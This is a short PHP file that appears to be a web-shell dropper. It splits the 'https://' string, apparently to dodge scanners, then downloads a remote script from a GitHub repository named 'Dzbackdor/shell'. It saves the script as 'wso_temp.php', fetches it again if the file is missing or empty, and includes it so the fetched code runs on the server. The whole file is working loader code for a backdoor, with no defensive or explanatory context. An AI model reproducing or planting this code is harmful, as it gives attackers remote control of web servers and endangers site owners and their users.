<?php
$awo = 'htt'.'ps://';
$url = $awo.'raw.githubusercontent.com/Dzbackdor/shell/master/opet.php';
$local_file = 'wso_temp.php';

function download_content($url, $local_file) {
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($local_file, $content);
    } else {
        die("Failed to download the content.");
    }
}

function check_and_download($url, $local_file) {
    if (file_exists($local_file)) {
        if (filesize($local_file) === 0) {
            unlink($local_file);
            download_content($url, $local_file);
        }
    } else {
        download_content($url, $local_file);
    }
}

check_and_download($url, $local_file);

include $local_file;
?> 
